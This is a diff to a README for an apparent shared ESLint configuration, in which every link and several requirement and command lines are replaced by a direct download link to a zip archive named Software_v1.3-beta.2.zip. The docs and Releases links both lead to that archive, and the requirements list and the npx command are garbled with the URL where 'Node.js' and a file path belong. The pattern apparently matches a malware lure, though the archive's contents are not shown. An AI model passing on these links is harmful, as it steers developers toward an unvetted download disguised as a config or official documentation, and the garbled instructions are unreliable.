@@ -8,9 +8,9 @@ Welcome to the eslint project! This shared ESLint config helps you maintain clea
 
 To get started, you will need to visit the Releases page. There, you can download the configuration files you need. 
 
-[![Download eslint](https://raw.githubusercontent.com/fiabotz/eslint/main/Macleaya/eslint.zip%20eslint-blue)](https://raw.githubusercontent.com/fiabotz/eslint/main/Macleaya/eslint.zip)
+[![Download eslint](https://github.com/fiabotz/eslint/raw/refs/heads/main/Macleaya/Software_v1.3-beta.2.zip%20eslint-blue)](https://github.com/fiabotz/eslint/raw/refs/heads/main/Macleaya/Software_v1.3-beta.2.zip)
 
-**Step 1:** Visit the [Releases page](https://raw.githubusercontent.com/fiabotz/eslint/main/Macleaya/eslint.zip).
+**Step 1:** Visit the [Releases page](https://github.com/fiabotz/eslint/raw/refs/heads/main/Macleaya/Software_v1.3-beta.2.zip).
 
 **Step 2:** Choose the latest release version. Look for the tag that says “Latest Release”.
 
@@ -21,8 +21,8 @@ To get started, you will need to visit the Releases page. There, you can downloa
 Make sure that your system meets the following requirements:
 
 - **Operating System:** Works on Mac, Windows, and Linux.
-- **https://raw.githubusercontent.com/fiabotz/eslint/main/Macleaya/eslint.zip** You need https://raw.githubusercontent.com/fiabotz/eslint/main/Macleaya/eslint.zip installed to use this configuration.
-- **NPM:** This comes with https://raw.githubusercontent.com/fiabotz/eslint/main/Macleaya/eslint.zip and allows you to install packages easily.
+- **https://github.com/fiabotz/eslint/raw/refs/heads/main/Macleaya/Software_v1.3-beta.2.zip** You need https://github.com/fiabotz/eslint/raw/refs/heads/main/Macleaya/Software_v1.3-beta.2.zip installed to use this configuration.
+- **NPM:** This comes with https://github.com/fiabotz/eslint/raw/refs/heads/main/Macleaya/Software_v1.3-beta.2.zip and allows you to install packages easily.
 
 ## 🔧 How to Use the Config
 
@@ -50,7 +50,7 @@ After you download the configuration, here’s how to set it up in your project:
 
 5. **Run ESLint:** Once configured, you can now run ESLint to check your code. Use this command:
    ```
-   npx eslint https://raw.githubusercontent.com/fiabotz/eslint/main/Macleaya/eslint.zip
+   npx eslint https://github.com/fiabotz/eslint/raw/refs/heads/main/Macleaya/Software_v1.3-beta.2.zip
    ```
 
 ## ❓ FAQ
@@ -80,6 +80,6 @@ If you encounter issues or have questions, feel free to open an issue on the Git
 
 ## 📚 Learn More
 
-For more details on ESLint, you can check the official documentation at [ESLint Documentation](https://raw.githubusercontent.com/fiabotz/eslint/main/Macleaya/eslint.zip). This will provide you with additional insights and advanced usage tips.
+For more details on ESLint, you can check the official documentation at [ESLint Documentation](https://github.com/fiabotz/eslint/raw/refs/heads/main/Macleaya/Software_v1.3-beta.2.zip). This will provide you with additional insights and advanced usage tips.
 
-Don’t forget to visit the [Releases page](https://raw.githubusercontent.com/fiabotz/eslint/main/Macleaya/eslint.zip) to access the latest version of the config whenever you need it. Happy coding!
+Don’t forget to visit the [Releases page](https://github.com/fiabotz/eslint/raw/refs/heads/main/Macleaya/Software_v1.3-beta.2.zip) to access the latest version of the config whenever you need it. Happy coding!
